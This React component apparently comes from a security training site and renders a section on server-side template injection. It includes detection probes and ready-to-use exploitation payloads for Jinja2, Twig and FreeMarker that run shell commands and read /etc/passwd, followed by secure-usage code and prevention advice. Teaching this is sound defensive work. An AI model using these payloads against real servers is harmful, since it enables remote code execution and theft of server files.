
import React from 'react';
import { Code } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const SSTI: React.FC = () => {
  return (
    <section id="ssti" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Server-Side Template Injection (SSTI)</h3>
      <p className="mb-6">
        Server-Side Template Injection (SSTI) occurs when user input is embedded in a template in an unsafe manner.
        Template engines are designed to generate web pages by combining fixed templates with volatile data. SSTI
        vulnerabilities arise when user input is concatenated directly into templates rather than passed in as data.
        This can lead to remote code execution on the server.
      </p>
      
      <h4 className="text-xl font-semibold mt-6 mb-3">Common Template Engines</h4>
      <ul className="list-disc pl-6 space-y-2 mb-4">
        <li><strong>Jinja2 (Python):</strong> Used in Flask applications</li>
        <li><strong>Twig (PHP):</strong> Used in Symfony applications</li>
        <li><strong>FreeMarker (Java):</strong> Used in Spring applications</li>
        <li><strong>Velocity (Java):</strong> Apache Velocity template engine</li>
        <li><strong>Smarty (PHP):</strong> Popular PHP template engine</li>
        <li><strong>Handlebars/Mustache (JavaScript):</strong> Used in Node.js applications</li>
      </ul>
      
      <h4 className="text-xl font-semibold mt-6 mb-3">Detection Payloads</h4>
      <CodeExample 
        language="text" 
        isVulnerable={true}
        title="Basic Detection Payloads" 
        code={`# Mathematical expressions (template-agnostic)
{{7*7}}
\${7*7}
#{7*7}
%{7*7}
\${{7*7}}

# If you see "49" in the response, SSTI is likely present

# Jinja2/Twig detection
{{7*'7'}}  # Should return "7777777" in Jinja2/Twig

# FreeMarker detection
\${7*7}     # Should return "49" in FreeMarker

# Velocity detection  
#set(\$x=7*7)\$x  # Should return "49" in Velocity

# Smarty detection
{7*7}      # Should return "49" in Smarty`} 
      />
      
      <h4 className="text-xl font-semibold mt-6 mb-3">Exploitation Examples</h4>
      <CodeExample 
        language="python" 
        isVulnerable={true}
        title="Jinja2 SSTI Exploitation" 
        code={`# Basic payload structure for Jinja2
{{''.__class__.__mro__[2].__subclasses__()}}

# Get all available classes
{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].exit()}}

# File read payload
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Command execution payload
{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}

# Alternative command execution
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}

# Using request object (Flask specific)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`} 
      />
      
      <CodeExample 
        language="php" 
        isVulnerable={true}
        title="Twig SSTI Exploitation" 
        code={`# Basic Twig payload
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Alternative Twig payload
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}

# File operations in Twig
{{_self.env.enableDebug()}}{{_self.env.enableAutoReload()}}
{{source('/etc/passwd')}}

# Using global variables
{{dump(app)}}  # Dump application object`} 
      />
      
      <CodeExample 
        language="java" 
        isVulnerable={true}
        title="FreeMarker SSTI Exploitation" 
        code={`# FreeMarker command execution
<#assign ex="freemarker.template.utility.Execute"?new()> \${ ex("id") }

# Alternative FreeMarker payload
\${"freemarker.template.utility.Execute"?new()("whoami")}

# File read in FreeMarker
<#assign file=object?api.class.forName("java.io.File")?constructor?api("/etc/passwd")?new()>
<#assign scanner=object?api.class.forName("java.util.Scanner")?constructor?api(file)?new()>
<#assign content=scanner.nextLine()>
\${content}`} 
      />
      
      <CodeExample 
        language="javascript" 
        isVulnerable={false}
        title="Secure Template Usage" 
        code={`// Secure Jinja2 usage (Python/Flask)
from flask import Flask, render_template_string
from markupsafe import escape

app = Flask(__name__)

@app.route('/user/<username>')
def user_profile(username):
    # SECURE: Pass user input as template variable, not in template string
    template = "Hello {{ username }}!"
    return render_template_string(template, username=escape(username))

// Secure Handlebars usage (Node.js)
const Handlebars = require('handlebars');

// SECURE: Compile template separately from data
const template = Handlebars.compile('Hello {{username}}!');
const result = template({ username: userInput });

// Secure Twig usage (PHP)
\$loader = new \\Twig\\Loader\\ArrayLoader(['template' => 'Hello {{ username }}!']);
\$twig = new \\Twig\\Environment(\$loader);

// SECURE: Pass data as context, not in template
echo \$twig->render('template', ['username' => htmlspecialchars(\$userInput)]);

// General secure practices:
// 1. Use logic-less templates when possible
// 2. Implement proper input validation and sanitization
// 3. Use template sandboxing features
// 4. Never concatenate user input directly into template strings
// 5. Use autoescaping features of template engines`} 
      />
      
      <h4 className="text-xl font-semibold mt-6 mb-3">Prevention Strategies</h4>
      <ul className="list-disc pl-6 space-y-2">
        <li>Never concatenate user input directly into template strings</li>
        <li>Use parameterized templates and pass user input as template variables</li>
        <li>Enable template sandboxing features when available</li>
        <li>Implement strict input validation and output encoding</li>
        <li>Use logic-less template engines when possible (e.g., Mustache)</li>
        <li>Apply the principle of least privilege to template execution contexts</li>
        <li>Regular security audits of template usage in applications</li>
      </ul>
    </section>
  );
};

export default SSTI;
